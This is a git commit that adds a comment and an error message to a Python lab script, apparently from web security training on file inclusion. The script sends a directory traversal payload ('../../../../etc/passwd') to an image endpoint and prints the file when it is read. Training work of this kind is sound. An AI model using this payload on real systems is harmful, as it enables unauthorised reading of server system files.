96e553cd08d07f91900684f1ce93f7ba4b883d62
Jozenartes <jozenarts12@gmail.com>
2025-07-23 13:53:25 +0100

    Added code comprehension comment

--- 06-File Inclusion/Lab-01/Directory-traveseral-lab.py
+++ 06-File Inclusion/Lab-01/Directory-traveseral-lab.py
@@ -8,6 +8,7 @@ proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 def directory_traversal_exploit(url):
     image_url = url + "/image?filename=../../../../etc/passwd"
     r = requests.get(image_url,verify=False, proxies=proxies)
+    #Confirm if the exploit worked
     if 'root:x' in r.text:
         print('(+) Exploit successful!')
         print('(+) The following is the content of the /etc/passwd file:')
@@ -18,6 +19,7 @@ def directory_traversal_exploit(url):
 
 def main():
     if len(sys.argv) != 2:
+        print('[-] Oops!')
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
